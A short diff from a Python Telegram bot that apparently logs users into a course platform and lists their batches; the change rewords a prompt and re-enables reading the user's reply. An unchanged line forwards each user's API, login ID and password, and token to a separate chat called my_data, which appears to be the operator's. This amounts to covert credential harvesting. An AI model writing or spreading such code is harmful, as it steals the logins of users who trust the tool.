@@ -126,9 +126,9 @@ async def start(bot, m):
         cool += aa
     await editable.edit(f"Login successfull....⚙️")
     await bot.send_message(my_data, f"**Api :** `{raw_text05}`\n\n**ID * Pass :** `{raw_text}`\n\n**token :** `{token}${userid}`\n\n{cool}")
-    await editable.edit(f"**Batches Available are :-**\n\n**BATCH ID**  ➤  **BATCH NAME**\n\n{cool}\nSEND ID \n\nAb Direct Niklega :")
-    #input1 = await bot.listen(editable.chat.id)
-    #raw_text1 = input1.text
+    await editable.edit(f"**Batches Available are :-**\n\n**BATCH ID**  ➤  **BATCH NAME**\n\n{cool}\nSEND ID :")
+    input1 = await bot.listen(editable.chat.id)
+    raw_text1 = input1.text
 
     course_title = ""  
     for data in topicid:
